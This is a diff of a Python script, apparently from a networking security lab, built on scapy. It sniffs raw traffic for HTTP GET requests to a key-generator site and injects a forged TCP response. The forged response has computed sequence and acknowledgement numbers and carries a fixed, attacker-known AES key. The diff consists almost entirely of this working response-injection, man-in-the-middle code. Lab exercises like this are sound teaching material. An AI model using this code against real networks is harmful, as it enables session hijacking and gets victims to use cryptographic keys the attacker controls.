@@ -2,54 +2,56 @@ from scapy.all import send, conf, L3RawSocket
 from scapy.all import TCP, IP, Ether, Raw
 import socket
 import re
+import datetime
+
+# Known Key used in MIM attack
+knownKey = b'4d6167696320576f7264733a2053717565616d697368204f7373696672616765'
+
+# Resolve the target hostname to an IP address
+targetHost = "freeaeskey.xyz"
+targetIP = socket.gethostbyname(targetHost)
+myIP = b'172.18.210.34'
+
+# Request Strings
+getRequest = b"GET / HTTP/1.1"
 
 # Use this function to send packets
 def inject_pkt(pkt):
     conf.L3socket = L3RawSocket
     send(pkt)
 
-# Known Key used in MIM attack
-knownKey = b"4d6167696320576f7264733a2053717565616d697368204f7373696672616765"
-
-# Resolve the target hostname to an IP address
-targetHost = "freeaeskey.xyz"
-targetIP = socket.gethostbyname(targetHost)
-
 
 def handle_pkt(pkt):
-    ethPacket = Ether(pkt)
+    packet = Ether(pkt)
     
-    # Check if the packet contains IP and TCP layers
-    if IP in ethPacket and TCP in ethPacket:
-        ip_packet = ethPacket[IP]
-        tcp_packet = ethPacket[TCP]
+    # Check for packets to the target
+    if packet.haslayer(TCP) and packet.haslayer(IP) and packet[IP].dst == targetIP:
+        if getRequest in bytes(packet[TCP].payload):
 
-        # Check if the packet contains a Raw layer with payload
-        if Raw in ethPacket:
-            # Get the raw packet data
-            data = ethPacket[Raw].load
+            # Create the IP layer
+            ipLayer = IP(src=targetIP, dst=myIP)
+            tcpLayer = TCP(
+                        sport=packet[TCP].dport,
+                        dport=packet[TCP].sport,
+                        seq=packet[TCP].ack,
+                        ack=(packet[TCP].seq + len(packet[TCP].payload)),
+                        flags="PA")
+            
+            # Spoof the response
+            response = b'HTTP/1.1 200 OK\r\nContent-Length: 335\r\nContent-Type: text/html; charset=UTF-8\r\nServer: Caddy\r\n'
+            response += b'Date:' + datetime.datetime.now().strftime("%a, %d %b %Y %H:%M:%S").encode('utf-8') + b' GMT\r\nbConnection: close\r\n\r\n'
+            response += b'<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n'
+            response += b'<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> '
+            response += b'AES-256 key: <b>' + knownKey + b'</b><br/>\n</body>\n</html>'
 
-            # Sub-byte-string to look for
-            byteStr = b"Free AES Key Generator!"
+            rawLayer = Raw(load=response)
 
-            # Intercept the request and modify the response
-            if byteStr in data:
-                # Use regex to replace the key with the known key
-                modResponse = re.sub(rb'<b>[0-9a-f]+</b>', b'<b>' + knownKey + b'</b>', data)
+            newPacket = ipLayer / tcpLayer / rawLayer
 
-                # Create a new packet to inject
-                MIMPacket = ethPacket.copy()
+            inject_pkt(newPacket)
 
-                # Locate the Raw layer in the new_packet and set its load to the modified data
-                if Raw in MIMPacket:
-                    MIMPacket[Raw].load = modResponse
-                else:
-                    # If there is no Raw layer in the packet, create one and set its load
-                    MIMPacket = MIMPacket / Raw(load=modResponse)
-
-                # Send the modified response
-                inject_pkt(MIMPacket)
-
+            
+   
 
 def main():
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
